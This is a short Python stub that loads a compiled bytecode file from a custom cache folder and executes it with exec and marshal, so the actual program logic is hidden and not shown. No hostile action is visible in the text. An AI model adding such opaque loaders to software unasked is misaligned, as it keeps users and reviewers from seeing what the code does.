
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'BinaryToImage_90ff4b6e0862402bb3568190e34e3f60.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
